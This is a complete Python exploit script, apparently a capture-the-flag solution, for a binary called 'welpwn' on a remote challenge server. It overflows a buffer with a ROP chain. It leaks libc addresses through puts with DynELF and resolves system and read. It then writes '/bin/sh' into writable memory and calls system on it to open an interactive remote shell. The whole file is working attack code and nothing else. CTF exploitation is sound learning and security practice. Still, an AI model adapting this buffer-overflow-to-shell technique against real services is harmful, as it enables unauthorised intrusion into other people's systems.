#!/usr/bin/env python
# coding:utf-8

from utils import *

LEN_TO_RET = 0x18
POP4_RET = 0x000000000040089c
POP_RDI_RET = 0x00000000004008a3
POP_RSI_R15_RET = 0x00000000004008a1

context.arch = 'amd64'
# context.log_level = 'debug'

elf = ELF('./welpwn_932a4428ea8d4581431502ab7e66ea4b')

io = remote('180.76.178.48', 6666)
# io = process('./welpwn_932a4428ea8d4581431502ab7e66ea4b')
# io = debug('./welpwn_932a4428ea8d4581431502ab7e66ea4b'); io.b('read'); io.r()

def leak(address):
    payload = cyclic(LEN_TO_RET)
    payload += p64(POP4_RET)
    payload += p64(POP_RDI_RET) + p64(address) + p64(elf.plt['puts'])
    payload += p64(elf.entry)
    io.clean()
    io.send(payload)
    io.recvuntil(pack(POP4_RET, 'all'))
    return io.recv()[:-1] + '\x00'

libc = DynELF(leak, elf.entry, elf=elf)
system_addr = libc.lookup('system', 'libc')
read_addr = libc.lookup('read', 'libc')

log.info('system address: 0x%08x' % system_addr)

payload = cyclic(LEN_TO_RET)
payload += p64(POP4_RET)

address = max(elf.got.values()) + 0x10
payload += p64(POP_RDI_RET) + p64(0)
payload += p64(POP_RSI_R15_RET) + p64(address) + p64(0)
payload += p64(elf.plt['read'])

payload += p64(POP_RDI_RET) + p64(address)
payload += p64(system_addr)

# payload += p64(POP_RDI_RET) + p64(binsh_addr) + p64(system_addr)
io.send(payload)

io.send('/bin/sh\x00')

io.ext_interactive()
